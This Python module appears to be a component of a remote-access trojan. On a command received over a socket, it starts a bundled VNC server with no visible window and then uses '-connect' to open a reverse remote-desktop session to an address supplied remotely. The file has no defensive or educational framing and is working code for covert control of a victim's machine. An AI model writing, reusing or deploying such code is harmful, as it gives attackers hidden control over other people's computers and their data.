import psutil
import subprocess
import time
import justanotherpackage
import os
import json

def find_process_by_exe(file_name):
    for proc in psutil.process_iter(['pid', 'exe']):
        try:
            if proc.info['exe'] and file_name.lower() in proc.info['exe'].lower():
                return proc.info['pid']
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            continue
    return None

def start_remote_desktop(data, client_socket):
    try:
        port = data["port"]
        remote_pid = find_process_by_exe("winvnc.exe")
        program_path = os.path.join(
            os.path.dirname(justanotherpackage.__file__), "vnc", "winvnc.exe"
        )

        if not remote_pid:
            subprocess.Popen(
                [program_path],
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
                )
            time.sleep(3)

        remote_pid = find_process_by_exe("winvnc.exe")
                
        if remote_pid:
            command = [program_path, "-connect", port]
            subprocess.Popen(command, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

    except (ConnectionError, ConnectionResetError):
        pass